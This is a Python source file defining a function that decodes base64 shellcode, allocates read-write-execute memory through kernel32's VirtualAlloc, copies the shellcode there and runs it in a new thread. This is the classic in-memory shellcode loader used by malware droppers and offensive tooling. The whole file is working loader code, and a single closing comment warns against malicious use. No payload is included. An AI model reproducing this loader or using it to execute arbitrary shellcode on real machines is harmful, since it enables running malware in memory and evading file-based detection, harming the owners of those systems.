import base64
import ctypes
from ctypes import wintypes

# Load the kernel32 library
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

# Define argument and return types for necessary functions
kernel32.VirtualAlloc.argtypes = [wintypes.LPVOID, wintypes.SIZE_T, wintypes.DWORD, wintypes.DWORD]
kernel32.VirtualAlloc.restype = wintypes.LPVOID

kernel32.RtlMoveMemory.argtypes = [wintypes.LPVOID, wintypes.LPVOID, wintypes.SIZE_T]

kernel32.CreateThread.argtypes = [wintypes.LPVOID, wintypes.DWORD, wintypes.LPVOID, wintypes.LPVOID, wintypes.DWORD, wintypes.LPDWORD]
kernel32.CreateThread.restype = wintypes.HANDLE

kernel32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]
kernel32.WaitForSingleObject.restype = wintypes.DWORD

kernel32.CloseHandle.argtypes = [wintypes.HANDLE]

# Constants
PAGE_EXECUTE_READWRITE = 0x40
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000

def run_shell_code(code: bytes) -> str:
    # Decode the base64 encoded shellcode
    shellcode = base64.b64decode(code)
    
    # Allocate memory for the shellcode
    addr = kernel32.VirtualAlloc(0, len(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    if addr == 0:
        return "Shellcode failed to allocate memory."
    
    # Copy shellcode to the allocated memory
    kernel32.RtlMoveMemory(addr, shellcode, len(shellcode))
    
    # Create a thread to execute the shellcode
    h_thread = kernel32.CreateThread(0, 0, addr, 0, 0, 0)
    if h_thread == 0:
        return "Shellcode failed to create thread."
    
    # Wait for the thread to complete execution
    kernel32.WaitForSingleObject(h_thread, 0xFFFFFFFF)
    
    # Clean up the thread handle
    kernel32.CloseHandle(h_thread)
    
    return "Shellcode executed."

# Reminder: Do not use this code to run malicious code.